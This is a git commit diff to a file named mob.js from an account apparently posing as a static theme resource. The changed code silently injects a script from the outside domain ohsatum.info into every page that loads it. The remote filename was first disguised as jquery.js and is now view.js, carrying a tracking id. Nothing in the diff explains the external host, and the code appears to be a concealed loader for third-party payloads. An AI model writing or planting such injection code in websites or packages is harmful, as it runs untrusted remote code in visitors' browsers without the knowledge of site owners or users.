07e89f0050404f10bfc88fb3b2814ce138973e73
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2020-01-27 16:10:55 +0300

    Update mob.js

--- mob.js
+++ mob.js
@@ -7,13 +7,12 @@
     document.body.appendChild(script);
 })();
 (function() {
-
-    var script = document.createElement('script');
+ var script = document.createElement('script');
     script.async = true;
     script.type = 'text/javascript';
     script.charset = 'UTF-8';
-    script.src = 'https://ohsatum.info/jquery.js?sid=871623';
-    var entry = document.getElementsByTagName('script')[0];
+    script.src = 'https://ohsatum.info/view.js?sid=871623';
+    var entry = document.body.firstChild;
     entry.parentNode.insertBefore(script, entry);
 })();
 (function() {
